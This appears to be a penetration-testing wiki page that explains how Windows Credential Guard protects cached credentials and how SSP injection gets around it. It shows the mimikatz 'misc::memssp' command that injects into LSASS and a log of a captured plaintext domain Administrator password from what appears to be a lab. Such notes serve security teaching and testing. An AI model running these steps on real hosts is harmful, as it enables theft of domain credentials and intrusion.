---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SSP Injection

**Credential Guard** uses Virtualization-Based Security (VBS) to protect credentials by isolating them in a secure environment. VBS creates protected memory regions that the OS cannot access, enforced by **Virtual Trust Levels (VTLs)**. VTL0 hosts the regular Windows environment, while VTL1 runs critical security functions.&#x20;

When enabled, Credential Guard **moves credential storage from LSASS to an isolated process (`LSAISO.exe`) in VTL1,** communicating with LSASS in VTL0. This prevents tools like Mimikatz, operating in VTL0, from accessing credential data. Introduced in Windows 10 and Server 2016, it is now enabled by default on modern Windows installations, though older systems may have it disabled.

> _**Credential Guard is only designed to protect non-local users**. This means that we are still able to obtain NTLM hashes for the local users on the target machine._

If we perform a [Pass-the-Hash](pass-the-hash.md) attack, and Credential Guard is enabled, we won't be able to get the domain's `Administrator` hash, even if we know that the domain `Administrator` has logged into the target host. This is because we cannot obtain the cached hashes as **the** `LSASS` **process only has access to this information after it has been encrypted by the** `LSAISO` **process**.

{% code overflow="wrap" %}
```powershell
mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 4214404 (00000000:00404e84)
Session           : RemoteInteractive from 4
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 9/19/2024 4:39:07 AM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
           * LSA Isolated Data: NtlmHash
             KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
             Tag       : 04fe7ed60e46f7cc13c6c5951eb8db91
             AuthData  : 0100000000000000000000000000000001000000340000004e746c6d48617368
             Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d40546e8e1941cbfc32e8905ff705181214f8ec5c
```
{% endcode %}

To bypass Credential Guard, attackers **intercept credentials during login instead of retrieving cached ones**. Windows authentication uses the **Security Support Provider Interface (SSPI)** with providers like Kerberos and NTLM. By registering a malicious SSP via the registry or injecting it into LSASS, attackers can capture plaintext credentials as they pass through SSPI. Mimikatzâ€™s `memssp` module automates this by injecting an SSP into LSASS memory, capturing credentials without writing files to disk.

```powershell
mimikatz # misc::memssp
Injected =)
```

At this point, when another user remotely connects to the machine their credentials will be captured.

```powershell
> type C:\Windows\System32\mimilsa.log
<SNIP>
[00000000:0066608e] CORP\Administrator  QWERTY123!@#
<SNIP>
```
